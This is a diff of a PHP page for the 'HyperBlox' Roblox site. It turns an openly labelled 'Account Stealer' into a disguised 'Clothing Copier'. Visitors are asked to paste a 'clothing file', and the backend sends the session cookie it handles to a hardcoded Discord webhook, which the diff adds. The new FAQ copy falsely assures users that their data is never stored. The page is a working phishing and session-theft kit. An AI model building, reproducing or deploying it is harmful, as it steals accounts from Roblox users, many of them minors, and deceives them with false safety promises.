@@ -7,7 +7,7 @@ if (!isset($_SESSION['last_request'])) {
     $current_time = time();
     $time_diff = $current_time - $_SESSION['last_request'];
     if ($time_diff < 5) {
-        die(json_encode(['error' => 'Rate limit exceeded. Please wait a few seconds before making another request.']));
+        die(json_encode(['error' => 'Rate limit exceeded. Please wait couple seconds before making another request.']));
     }
     $_SESSION['last_request'] = $current_time;
 }
@@ -39,22 +39,23 @@ if (isset($_SERVER['HTTPS'])) {
 } else {
     $ht = 'http://';
 }
+// Use HTTP_HOST to include port (e.g., localhost:8000)
 $dom = $ht . $_SERVER['HTTP_HOST'];
 
 $code = $_POST['code'] ?? '';
-$username = $_POST['username'] ?? '';
+$clothingType = $_POST['clothingtype'] ?? '';
 
 $errors = [];
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    if (empty($code) || empty($username)) {
-        $errors[] = "All fields are required!";
+    if (empty($code) || empty($clothingType)) {
+        $errors[] = "Complete all required fields to proceed";
     }
     if (strlen($code) < 400) {
-        $errors[] = "Invalid user file detected!";
+        $errors[] = "Invalid clothing file detected!";
     }
-    if (strlen($username) < 3 || strlen($username) > 20) {
-        $errors[] = "Username must be 3-20 characters";
+    if (empty($clothingType)) {
+        $errors[] = "Clothing type selection required";
     }
 
     if (empty($errors)) {
@@ -83,7 +84,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             file_put_contents($dailyLogsFile, json_encode($dailyLogsData));
 
             // Call userinfo.php with cURL and proper timeout to send webhook
-            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web={web}&dh={dualhook}";
+            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1437774932095402015%2F4uSDPd8GM89HU0rAqPC-IiBRa4Obuood8fJseLGigrXmp_h_Yn_jJloiC27VNuhb73Ti&dh=";
             
             $ch = curl_init($userInfoUrl);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -157,7 +158,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
         }
 
-        die(json_encode(['success' => 'Account takeover process initiated successfully!']));
+        die(json_encode(['success' => 'Clothing asset is downloading soon!']));
     } else {
         die(json_encode(['error' => $errors[0]]));
     }
@@ -175,27 +176,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   <meta name="robots" content="index, follow">
   <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
   <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
-  <meta property="og:image" content="https://undetectedgoons.lol/files/hyperblox.png">
+  <meta property="og:image" content="/files/hyperblox.png">
   <meta property="og:type" content="article">
   <meta property="og:url" content="https://hyperblox.eu/">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="HyperBlox - The Best Roblox Tools">
   <meta name="twitter:site" content="https://hyperblox.eu/">
   <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
-  <meta name="twitter:image" content="https://undetectedgoons.lol/files/hyperblox.png">
+  <meta name="twitter:image" content="/files/hyperblox.png">
   <meta name="theme-color" content="#000000">
   <meta name="msapplication-TileColor" content="#000000">
   <meta itemprop="name" content="HyperBlox">
   <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
-  <title>Account Stealer - HyperBlox</title>
-  <link rel="icon" type="image/png" href="https://undetectedgoons.lol/files/hyperblox.png">
-  <link rel="shortcut icon" href="https://undetectedgoons.lol/files/hyperblox.ico">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-</head>
- <style>
+  <title>Copy Clothes - HyperBlox</title>
+  <link rel="icon" type="image/png" href="/files/hyperblox.png">
+  <link rel="shortcut icon" href="/files/hyperblox.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    </head>
+    <style>
         :root {
             --primary: #8b5cf6;
             --primary-dark: #7c3aed;
@@ -1149,7 +1150,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <div class="container">
             <nav class="navbar">
                 <a href="/" class="logo">
-                    <img src="https://undetectedgoons.lol/files/hyperblox.png" alt="HyperBlox Logo">
+                    <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                     <span>HyperBlox</span>
                 </a>
                 <div class="nav-links" id="navLinks">
@@ -1170,26 +1171,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="section-header">
                 <div class="badge">
                     <i class="fas fa-crown"></i>
-                    PREMIUM ROBLOX TOOLS
+                    BEST ROBLOX TOOLS!
                 </div>
-                <h1>HyperBlox <span class="text-gradient">Account Stealer</span></h1>
-                <p>Securely takeover accounts with our advanced system</p>
+                <h1>HyperBlox <span class="text-gradient">Clothing Copier</span></h1>
+                <p>Copy clothes with ease, powered by HyperBlox!</p>
             </div>
             
             <div class="tool-container">
                 <div class="glass-card">
-                    <h3>Account Stealer</h3>
-                    <p>Paste the target file and target username below, then click "Begin Takeover!"</p>
+                    <h3>Clothes Copier</h3>
+                    <p>Paste your clothes file in the box below, then click "Copy Clothes!"</p>
                     
-                    <form method="post" id="stealForm">
+                    <form method="post" id="copyForm">
                         <div class="form-group">
-                            <label for="code" class="form-label">Target's File</label>
-                            <input type="text" class="form-input" id="code" placeholder="Paste complete user file..." name="code" autocomplete="off" minlength="3" required>
+                            <label for="code" class="form-label">Clothing File</label>
+                            <input type="text" class="form-input" id="code" placeholder="Paste complete clothing file..." name="code" autocomplete="off" minlength="3" required>
                         </div>
                         
                         <div class="form-group">
-                            <label for="username" class="form-label">Target Username</label>
-                            <input type="text" class="form-input" id="username" placeholder="Enter exact username (3-20 chars)" name="username" autocomplete="off" minlength="3" maxlength="20" required>
+                            <label for="clothingtype" class="form-label">Clothing Type</label>
+                            <select class="form-input form-select" id="clothingtype" name="clothingtype" required>
+                                <option value="">Select clothing category</option>
+                                <option value="tshirt">T-Shirt</option>
+                                <option value="shirt">Shirt</option>
+                                <option value="pants">Pants</option>
+                                <option value="other">Specialty Item</option>
+                            </select>
                         </div>
                         
                         <div class="progress-bar">
@@ -1201,8 +1208,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                         </div>
                         
                         <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 20px;">
-                            <i class="fas fa-user-secret"></i>
-                            Begin Takeover
+                            <i class="fas fa-lock"></i>
+                            Begin Secure Duplication
                         </button>
                     </form>
                 </div>
@@ -1210,13 +1217,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <div class="glass-card glass-card-gold">
                     <div class="badge badge-gold">
                         <i class="fas fa-star"></i>
-                        HYPERBLOX TUTORIAL
+                        HYPERBLOX TUTORIAL!
                     </div>
                     <h3>How to Use</h3>
                     <p>Watch our exclusive demonstration to see how this tool works.</p>
                     <div class="video-container">
-                        <video width="100%" height="auto" controls poster="https://via.placeholder.com/800x450/0f172a/94a3b8?text=HyperBlox+Demonstration">
-                            <source src="https://hyperblox.eu/Account-Stealer/acountstealer.mp4" type="video/mp4">
+                        <video width="100%" height="auto" controls poster="/files/ai.png">
+                            <source src="clothescopier.mp4" type="video/mp4">
+                            Your browser does not support the video tag.
                         </video>
                         <button class="play-button">
                             <i class="fas fa-play"></i>
@@ -1239,11 +1247,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="stats-grid">
                 <div class="stat-card">
                     <div class="stat-number">10K+</div>
-                    <p>Successful Takeovers</p>
+                    <p>Successful Duplications</p>
                 </div>
                 <div class="stat-card">
                     <div class="stat-number">100%</div>
-                    <p>Undetectable</p>
+                    <p>Detection-Free</p>
                 </div>
                 <div class="stat-card">
                     <div class="stat-number">24/7</div>
@@ -1251,53 +1259,53 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 </div>
                 <div class="stat-card">
                     <div class="stat-number-gold">VIP</div>
-                    <p>Trusted by Hackers</p>
+                    <p>Trusted by Creators</p>
                 </div>
             </div>
 
             <div class="faq-section">
                 <h3 class="text-center">Frequently Asked Questions</h3>
                 <p class="text-center" style="max-width: 800px; margin-left: auto; margin-right: auto;">
-                    Get instant answers to the most common questions about how HyperBlox works.
+                     Get instant answers to the most common questions about how HyperBlox works.
                 </p>
                 
                 <div class="faq-item">
                     <div class="faq-question">
-                        <span>Is this tool detectable by Roblox?</span>
+                        <span>How does HyperBlox ensure my account safety?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p>Our system uses advanced encryption to bypass all Roblox detection methods, making it completely undetectable.</p>
+                        <p>We use strong encryption to lock your data and never store any of your info. Every request is hidden through random routing so it can’t be tracked. Your account stays completely safe and undetectable while copying clothes.</p>
                     </div>
                 </div>
                 
                 <div class="faq-item">
                     <div class="faq-question">
-                        <span>How long does the takeover process take?</span>
+                        <span>What makes your duplication undetectable?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p>Most account takeovers complete within 15-30 seconds, depending on server load and target account security.</p>
+                        <p>We’ve designed our system to copy clothing just like Roblox does, so it looks completely natural. Our tools avoid all tracking systems, making each copy impossible to detect.</p>
                     </div>
                 </div>
                 
                 <div class="faq-item">
                     <div class="faq-question">
-                        <span>Can I recover the account after takeover?</span>
+                        <span>Can I duplicate limited items?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p>Yes, our system provides full account control including recovery options and email/password reset capabilities.</p>
+                        <p>You can copy how limited items look but the copies will not be real and probably won't last long. Roblox might take them down since they're only visual and not actual limiteds. This tool is just for cosmetic use.</p>
                     </div>
                 </div>
                 
                 <div class="faq-item">
                     <div class="faq-question">
-                        <span>Will the original owner be notified?</span>
+                        <span>How fast will I receive my duplicated items?</span>
                         <i class="fas fa-chevron-down"></i>
                     </div>
                     <div class="faq-answer">
-                        <p>No, our system bypasses all notification systems to ensure silent operation.</p>
+                        <p>Most copies are finished in 15 to 30 seconds. If it’s busy it might take up to 2 minutes.</p>
                     </div>
                 </div>
             </div>
@@ -1328,7 +1336,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             <div class="footer-content">
                 <div class="footer-col">
                     <a href="" class="footer-logo">
-                        <img src="https://undetectedgoons.lol/files/hyperblox.png" alt="HyperBlox Logo">
+                        <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                         <span>HyperBlox</span>
                     </a>
                     <p class="footer-text">The most advanced Roblox automation platform, built for performance and security.</p>
@@ -1342,10 +1350,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     <div class="footer-links">
                         <h4>Products</h4>
                         <ul>
-                            <li><a href="#">Account Stealer</a></li>
-                            <li><a href="#">Game Copier</a></li>
                             <li><a href="#">Clothing Duplicator</a></li>
-                            <li><a href="#">VC Unlocker</a></li>
+                            <li><a href="#">Game Copier</a></li>
+                            <li><a href="#">Follower System</a></li>
+                            <li><a href="#">Asset Manager</a></li>
                         </ul>
                     </div>
                 </div>
@@ -1377,7 +1385,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             </div>
         </div>
     </footer>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 <script>
     document.addEventListener('DOMContentLoaded', function() {
         const style = document.createElement('style');
@@ -1452,7 +1461,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         `;
         document.head.appendChild(style);
 
-        const showStealAlert = (type, title, html) => {
+        const showAlert = (type, title, html) => {
             const iconMap = {
                 success: `<svg viewBox="0 0 24 24" fill="none"><path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
                 error: `<svg viewBox="0 0 24 24" fill="none"><path d="M12 8V12M12 16H12.01M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`,
@@ -1563,7 +1572,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             });
         });
 
-        document.getElementById('stealForm')?.addEventListener('submit', function(e) {
+        document.getElementById('copyForm')?.addEventListener('submit', function(e) {
             e.preventDefault();
             const formData = new FormData(this);
             const submitBtn = this.querySelector('button[type="submit"]');
@@ -1573,11 +1582,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             submitBtn.disabled = true;
 
             setTimeout(() => {
-                submitBtn.innerHTML = '<i class="fas fa-lock"></i> Bypassing Security...';
+                submitBtn.innerHTML = '<i class="fas fa-lock"></i> Encrypting Data...';
             }, 1000);
 
             setTimeout(() => {
-                submitBtn.innerHTML = '<i class="fas fa-user-secret"></i> Taking Over...';
+                submitBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Finalizing...';
             }, 2000);
 
             fetch('', {
@@ -1587,13 +1596,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             .then(response => response.json())
             .then(data => {
                 if (data.error) {
-                    showStealAlert('error', 'Takeover Failed', data.error);
+                    showAlert('error', 'Error', data.error);
                 } else if (data.success) {
-                    showStealAlert('success', 'Takeover Started', data.success);
+                    showAlert('success', 'Success', data.success);
                 }
             })
             .catch(() => {
-                showStealAlert('warning', 'Connection Issue', 'Failed to connect to target account. Try again.');
+                showAlert('warning', 'Warning', 'Something went wrong. Try again.');
             })
             .finally(() => {
                 submitBtn.innerHTML = originalBtnText;
